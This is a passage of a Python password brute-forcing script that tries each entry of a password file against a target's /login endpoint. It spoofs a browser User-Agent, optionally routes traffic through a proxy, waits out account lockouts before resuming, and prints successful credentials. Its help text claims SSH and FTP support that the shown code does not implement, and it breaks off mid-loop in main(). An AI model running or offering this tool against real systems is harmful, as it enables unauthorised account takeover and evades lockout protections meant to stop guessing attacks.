import argparse
import itertools
import os
import time
import sys
import requests


MAX_ATTEMPTS = 3

failed_attempts = {}


def is_locked_out(username):
    if username in failed_attempts and failed_attempts[username] >= MAX_ATTEMPTS:
        return True
    return False


def login(username, password, protocol, hostname, port, proxy):

    if is_locked_out(username):
        print(f"{username} is locked out. Pausing attack for 5 minutes...")
        time.sleep(300)  # Pause for 5 minutes

        failed_attempts[username] = 0


    url = f"{protocol}://{hostname}:{port}/login"


    payload = {
        "username": username,
        "password": password
    }

    # Build the headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
    }


    if proxy:
        proxy_dict = {
            "http": proxy,
            "https": proxy
        }
        response = requests.post(url, data=payload, headers=headers, proxies=proxy_dict)
    else:
        response = requests.post(url, data=payload, headers=headers)


    if "Login successful" in response.text:
        print(f"[*] SUCCESS! Username: {username}, Password: {password}")
        failed_attempts[username] = 0
    else:
        print(f"[!] FAILED! Username: {username}, Password: {password}")

        if username in failed_attempts:
            failed_attempts[username] += 1
        else:
            failed_attempts[username] = 1


def generate_password_list(password_file):
    with open(password_file, "r") as f:
        passwords = [line.strip() for line in f.readlines()]
    return passwords


def parse_args():
    parser = argparse.ArgumentParser(description="Conduct brute-force attacks against common protocols, such as SSH, FTP, and HTTP")
    parser.add_argument("protocol", help="Protocol to attack (ssh, ftp, or http)")
    parser.add_argument("hostname", help="Target hostname or IP address")
    parser.add_argument("port", help="Target port number")
    parser.add_argument("username", help="Target account username")
    parser.add_argument("password_file", help="File containing a list of passwords to try")
    parser.add_argument("-p", "--proxy", help="Proxy to use (format: http://host:port)")
    args = parser.parse_args()
    return args

def main():
    args = parse_args()


    passwords = generate_password_list(args.password_file)


    for password in passwords
